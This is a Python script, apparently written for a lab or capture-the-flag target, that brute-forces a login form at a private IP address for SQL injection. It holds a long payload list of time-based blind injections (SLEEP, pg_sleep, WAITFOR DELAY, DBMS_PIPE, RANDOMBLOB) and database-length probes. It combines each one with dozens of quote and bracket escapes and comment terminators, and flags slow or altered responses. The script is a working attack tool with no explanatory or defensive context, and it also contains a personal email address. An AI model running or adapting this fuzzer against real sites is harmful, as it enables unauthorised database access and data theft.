import requests
import time
userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57"
headers={"User-Agent":userAgent}
_email = "myRandomEmail@email.com"
_email = "stefan@immersivenews.co.uk"
password = "myRandomPassword!"
target = "http://10.102.1.119/login.php"
payloads = ["' + SLEEP(10)",
"' OR SLEEP(10)",
"' or SLEEP(10)",
"' AND SLEEP(10)",
"' and SLEEP(10)",
"' || SLEEP(10)",
"' & SLEEP(10)",
"' && SLEEP(10)",
"' | SLEEP(10)",
"' + sleep(10)",
"' OR sleep(10)",
"' or sleep(10)",
"' AND sleep(10)",
"' and sleep(10)",
"' || sleep(10)",
"' & sleep(10)",
"' && sleep(10)",
"' | sleep(10)",
"' || pg_sleep(10)",
"' WAITFOR DELAY '0:0:10'",
"' || [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
"' || 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
"' || [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
"' || 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
"' | [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
"' | 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
"' | [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
"' | 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
"' OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
"' OR 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
"' OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
"' OR 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
"' && [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
"' && 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
"' && [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
"' && 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
"' & [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
"' & 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
"' & [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
"' & 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
"' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
"' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
"' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
"' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
"'%%20OR%%20LENGTH(DATABASE())='1",
"'%%20OR%%20LENGTH(DATABASE())='2",
"'%%20OR%%20LENGTH(DATABASE())='3",
"'%%20OR%%20LENGTH(DATABASE())='4",
"'%%20OR%%20LENGTH(DATABASE())='5",
"'%%20OR%%20LENGTH(DATABASE())='6",
"'%%20OR%%20LENGTH(DATABASE())='7",
"'%%20OR%%20LENGTH(DATABASE())='8",
"'%%20OR%%20LENGTH(DATABASE())='9",
"'%%20OR%%20LENGTH(DATABASE())='10",
"'%%20OR%%20LENGTH(DATABASE())='11",
"'%%20OR%%20LENGTH(DATABASE())='12",
"'%%20OR%%20LENGTH(DATABASE())='13",
"'%%20OR%%20LENGTH(DATABASE())='14",
"'%%20OR%%20LENGTH(DATABASE())='15",
"'%%20OR%%20LENGTH(DATABASE())='16",
"'%%20OR%%20LENGTH(DATABASE())='17",
"'%%20OR%%20LENGTH(DATABASE())='18",
"'%%20OR%%20LENGTH(DATABASE())='19",
"'%%20OR%%20LENGTH(DATABASE())='20",
"'%%20OR%%20LENGTH(DATABASE())='21",
"'%%20OR%%20LENGTH(DATABASE())='22",
]
escapes = [ "'",
            '"',
            "`",
            "))}}",
            "))}",
            "'))}",
            '"))}',
            "`))}",
            "'))}}",
            '"))}}',
            "`))}}",
            ")}}",
            ")}",
            "')}",
            '")}',
            "`)}",
            "')}}",
            '")}}',
            "`)}}",
            "}}",
            "}",
            "'}",
            '"}',
            "`}",
            "'}}",
            '"}}',
            "`}}",
            "}}))",
            "}})",
            "'}})",
            '"}})',
            "`}})",
            "'}}))",
            '"}}))',
            "`}}))",
            "}))",
            "})",
            "'})",
            '"})',
            "`})",
            "'}))",
            '"}))',
            "`}))",
            "))",
            ")",
            "')",
            '")',
            "`)",
            "'))",
            '"))',
            "`))"]
comments = ["", "--", "#", "/*", "\\", "/", "//", "\\\\"]
spaces = ["", " "]
try:
    for space in spaces:
        print("running")
        for payload in payloads:
            for escape in escapes:
                for comment in comments:
                    email = _email+space+payload+comment
                    email = email.replace("'", escape, 1)
                    data={"email":email,
                            "password":password}
                    r = requests.post(target, data=data, headers=headers)
                    if r.elapsed.total_seconds() > 1.0 or len(r.text) != 2377:
                        print(r.status_code, r.elapsed.total_seconds(), len(r.text), email)
        time.sleep(5)

except:
    print("FAILED: ", r.status_code, r.elapsed.total_seconds(), len(r.text), email)
#print(r.text)
#print(r.request.url)
#print(type(r.request.headers))
#print(r.request.headers)
#for header, v in r.request.headers.items():
#    print("{}: {}".format(header, v))
#print(r.request.body)
